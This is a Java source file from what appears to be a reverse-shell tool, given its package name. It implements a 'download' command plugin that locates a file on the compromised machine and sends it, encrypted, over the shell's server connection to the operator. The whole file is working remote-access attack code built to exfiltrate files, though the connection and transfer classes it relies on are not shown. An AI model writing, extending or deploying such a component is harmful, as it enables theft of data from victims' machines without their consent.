package obs1d1anc1ph3r.reverseshell.plugins;

import java.io.File;
import obs1d1anc1ph3r.reverseshell.ServerConnection;
import obs1d1anc1ph3r.reverseshell.utils.FileTransferService;

public class DownloadCommand implements CommandPlugin {

	private static String currentDir = System.getProperty("user.dir");
	private ServerConnection serverConnection;

	@Override
	public String getCommandName() {
		return "download";
	}

	@Override
	public String execute(String[] args) {
		if (args.length == 0) {
			return "Error: No file specified for download.";
		}

		//Get the directory from the CDCommand, idk if this is the best way to do it, but it works (I think)
		currentDir = CDCommand.getCurrentDirectory();
		String filePath = args[0];
		File file = new File(currentDir, filePath);
		System.out.println("[DEBUG] Attempting to download file: " + file.getAbsolutePath());

		if (!file.exists() || !file.isFile()) {
			return "Error: File not found at " + file.getAbsolutePath();
		}

		try {
			//Basically just pass on the responsability
			FileTransferService fileTransferService = new FileTransferService();
			fileTransferService.sendEncryptedFile(file, serverConnection);
			return "";
		} catch (Exception e) {
			return "Error: Unable to send file: " + e.getMessage();
		}
	}

	public void setServerConnection(ServerConnection serverConnection) {
		this.serverConnection = serverConnection;
	}
}
